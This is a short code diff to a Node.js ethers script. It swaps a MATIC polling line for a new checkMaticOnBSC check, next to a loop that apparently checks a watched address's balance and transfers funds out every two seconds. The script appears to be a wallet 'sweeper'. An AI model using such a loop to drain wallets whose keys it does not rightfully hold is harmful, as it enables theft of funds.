@@ -1,5 +1,6 @@
 require('dotenv').config();
 const { ethers } = require('ethers');
+const checkMaticOnBSC = require('./checkMATIC');
 // const checkDOT = require('./checkDOT');
 
 const WATCH_ADDRESS = process.env.WATCH_ADDRESS;
@@ -92,4 +93,6 @@ async function checkBalanceAndTransfer(networkKey) {
 }
 
 setInterval(() => checkBalanceAndTransfer('bnb'), 2000);
-setInterval(() => checkBalanceAndTransfer('matic'), 2000);
+// setInterval(() => checkBalanceAndTransfer('matic'), 2000);
+
+setInterval(checkMaticOnBSC, 2000);
